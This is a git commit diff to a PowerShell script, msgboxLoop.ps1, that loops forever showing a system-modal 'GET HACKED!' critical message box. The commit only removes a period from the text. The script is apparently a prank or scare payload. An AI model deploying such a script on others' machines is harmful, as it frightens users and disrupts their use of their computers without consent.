d44c66d693c290eabd559e9fede7985086469525
creepyturnip <92087207+creepyturnip@users.noreply.github.com>
2023-05-22 10:32:59 +0200

    Update msgboxLoop.ps1

--- msgboxLoop.ps1
+++ msgboxLoop.ps1
@@ -2,5 +2,5 @@
 [void] [System.Reflection.Assembly]::LoadWithPartialName("Microsoft.VisualBasic") 
 
 while (1) {
-[Microsoft.VisualBasic.Interaction]::MsgBox("GET HACKED!.", "OKOnly,SystemModal,Critical", "eZZZZZ")
+[Microsoft.VisualBasic.Interaction]::MsgBox("GET HACKED!", "OKOnly,SystemModal,Critical", "eZZZZZ")
 }
